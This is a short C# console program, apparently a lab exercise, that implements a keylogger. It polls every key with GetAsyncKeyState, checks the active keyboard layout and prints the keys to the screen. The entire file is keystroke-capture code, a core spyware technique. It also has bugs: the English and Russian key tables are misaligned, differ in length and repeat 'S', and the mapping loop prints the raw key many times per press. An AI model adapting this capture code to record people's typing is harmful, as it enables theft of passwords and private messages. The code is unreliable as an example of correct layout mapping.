using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Linq;
using System.Threading;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Globalization;

namespace Lab4_1_
{
    class Program
    {
        public static char[] english = new[] { 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', '[', ']', 'A', 'S', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', ';',      'Z', 'X', 'C', 'V', 'B', 'N', 'M', ',' , '.'};
        public static char[] russain = new[] { 'Й', 'Ц', 'У', 'К', 'Е', 'Н', 'Ф', 'Г', 'Ш', 'Щ', 'З', 'Х', 'Ъ', 'Ф', 'Ы', 'В', 'А', 'П', 'Р', 'О', 'Л', 'Д', 'Ж', 'Э', 'Я', 'Ч', 'С', 'М', 'И', 'Т', 'Ь', 'Б', 'Ю', 'Я'};
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {
            StartLogging();
        }

        static void StartLogging()
        {
            while (true)
            {
                ushort n = GetKeyboardLayout();
                Thread.Sleep(50);
                for (Int32 i = 0; i < 255; i++)
                {
                    short keyState = GetAsyncKeyState(i);
                    if (keyState == -32768)
                    {
                        int word = (int)i;
                        if (n == 1033)
                        {
                            Console.WriteLine((Keys)word);
                        }
                        else
                        {
                            for (int ii = 0; ii < english.Length; ii++)
                            {
                                if (english[ii] == (char)word)
                                {
                                    Console.WriteLine(russain[ii]);
                                }
                                else
                                {
                                    Console.WriteLine((Keys)word);
                                }
                            }
                        }
                    }
                }
            }
        }
        [DllImport("user32.dll", SetLastError = true)]
        static extern int GetWindowThreadProcessId(
            [In] IntPtr hWnd,
            [Out, Optional] IntPtr lpdwProcessId
            );

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern ushort GetKeyboardLayout(
            [In] int idThread
            );

        /// <summary>
        /// Вернёт Id раскладки.
        /// </summary>
        static ushort  GetKeyboardLayout()
        {
            return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
        }
    }
}
